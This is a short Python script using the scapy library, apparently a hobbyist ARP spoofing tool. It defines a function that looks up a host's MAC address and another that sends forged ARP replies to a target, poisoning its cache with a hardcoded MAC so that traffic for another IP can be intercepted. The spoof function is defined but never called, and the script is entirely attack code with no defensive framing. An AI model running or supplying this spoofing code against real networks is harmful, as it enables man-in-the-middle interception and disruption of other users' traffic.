# !/user/bin/python3
import scapy.all as scapy


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    print(answered_list[0][1].hwsrc)


def spoof(target_ip, spoof_ip):
    paket = scapy.ARP(
        op=2, pdst=target_ip, hwsrc="88:78:73:30:1C:95", psrc=spoof_ip)
    scapy.send(paket)


get_mac("ip address")
